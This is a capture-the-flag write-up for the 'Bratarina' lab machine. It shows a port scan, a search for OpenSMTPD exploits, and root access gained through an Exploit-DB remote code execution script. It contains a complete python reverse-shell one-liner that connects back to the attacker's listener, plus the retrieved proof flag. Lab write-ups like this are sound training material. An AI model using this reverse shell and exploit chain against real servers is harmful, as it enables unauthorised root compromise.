# CTF Writeup: Bratarina

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.156.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 22:51 EST
Nmap scan report for 192.168.156.71
Host is up (0.023s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.206], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 2.6.32 - 3.10 (90%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s
| smb2-time: 
|   date: 2025-12-20T03:52:14
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2025-12-19T22:52:15-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   21.93 ms 192.168.45.1
2   21.88 ms 192.168.45.254
3   22.59 ms 192.168.251.1
4   22.65 ms 192.168.156.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.80 seconds
```

## Vulnerability Assessment

I immediatly started up searching for CVE's on the OpenSMTPD Service.

```
searchsploit OpenSMTPD 2.0.0         
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                    | openbsd/remote/48140.c
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Initial Access & Privilege Escalation

Downloaded the following exploit:

```
https://www.exploit-db.com/exploits/47984
```

This exploit allows us to execute arbitrary commands as root user on the target system.

In order to receive RCE I first started an listener on port 80, because the firewall on the server apparently blocks other ports.

```
nc -lvnp 80
```

Used the following syntax & python rce script in order to gain RCE.

```
python3 exploit.py 192.168.156.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.206\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```
nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.156.71] 48248
root@bratarina:~#
```

Retrieved proof.txt in /root directory.

```
2543f8fb87b73c78526b410e20b5c583
```
